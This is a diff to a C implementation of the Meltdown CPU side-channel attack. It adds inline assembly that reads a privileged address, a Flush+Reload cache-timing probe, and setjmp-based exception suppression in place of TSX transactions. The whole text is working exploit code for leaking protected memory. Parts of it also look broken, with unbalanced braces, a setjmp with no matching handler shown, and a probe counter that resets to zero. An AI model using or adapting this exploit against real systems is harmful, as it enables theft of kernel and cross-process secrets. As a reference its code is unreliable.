@@ -8,18 +8,19 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
-#include "rtm.h"
+#include <immintrin.h>
 
 size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
-static int measurements = 10; /**< Number of measurements to perform for one address */
-static int accept_after = 1; /**< How many measurements must be the same to accept the read value */
-static int retries = 10000; /**< Number of Meltdown retries for an address */
-static char *mem = NULL;
-static size_t phys_addr = 0x80000000;
+int measurements = 10; /**< Number of measurements to perform for one address */
+int accept_after = 1; /**< How many measurements must be the same to accept the read value */
+int retries = 10000; /**< Number of Meltdown retries for an address */
+char *mem = NULL;
+size_t phys_addr = 0x80000000;
+static jmp_buf buf;
 
 
 static inline size_t rdtsc();
-  asm (
+  asm(
     ".intel_syntax noprefix ;"
     "_rdtsc: ;"
     "mfence ;"
@@ -33,7 +34,7 @@ static inline size_t rdtsc();
 static inline void maccess(void *p);
   asm(
     ".intel_syntax noprefix ;"
-    "_maccess:"
+    "_maccess: ;"
     "enter 0,0 ;"
     "mov eax, [ebp+8] ;"
     "leave ;"
@@ -54,7 +55,7 @@ static void flush(void *p);
 
 void calc_cache_threshold(){
   size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
-  size_t dummy[16];
+  size_t dummy[64];
   size_t *ptr = dummy + 8;
   size_t start = 0, end = 0;
 
@@ -94,10 +95,10 @@ if(end  - start < cache_miss_threshold){
   return 0;
 }
 
-void Meltdown(size_t p1, void *p2){
-  asm volatile(
+static void Meltdown(size_t p1, void *p2);
+  asm(
     ".intel_syntax noprefix;"
-  //  "_Meltdown: ;"
+   "_Meltdown: ;"
     "enter 0,0 ;"
     "mov ecx, [ebp+8];"
     "mov ebx, [ebp+12];"
@@ -109,8 +110,7 @@ void Meltdown(size_t p1, void *p2){
     "leave ;"
     "ret "
   );
-}
-int READ(size_t address){
+int __attribute__((optimize("-Os"))) READ(size_t address){
 /*                                                                */
   int value;
 /* Define prope array and initilize it with zero as intial value */
@@ -120,11 +120,13 @@ for(int i = 0 ; i < 256 ; i++)
 for (int i = 0 ; i < measurements ; i++){
 /* Reading from memory using tsx as a exception suppression machenasim */
   while (retries--) {
-    if (_xbegin() == _XBEGIN_STARTED){
+    if(!setjmp(buf)){
+    //if (_xbegin() == _XBEGIN_STARTED){
       Meltdown(phys_addr, mem);
-      _xend();
-    }else{
-      return 0;
+      //_xend();
+    //}else{
+      //return 0;
+    }
     }
     for(int i = 0 ; i < 256 ; i++){
       if(Flush_Reload(mem + i*4096)){
@@ -136,7 +138,7 @@ for (int i = 0 ; i < measurements ; i++){
   }
     value = 0;
     prope[value]++;
-}
+
 int max_v=0, max_i=0;
 for (int i = 0 ; i < 256 ; i++){
   if(prope[i]>max_v && prope[i]>=accept_after){
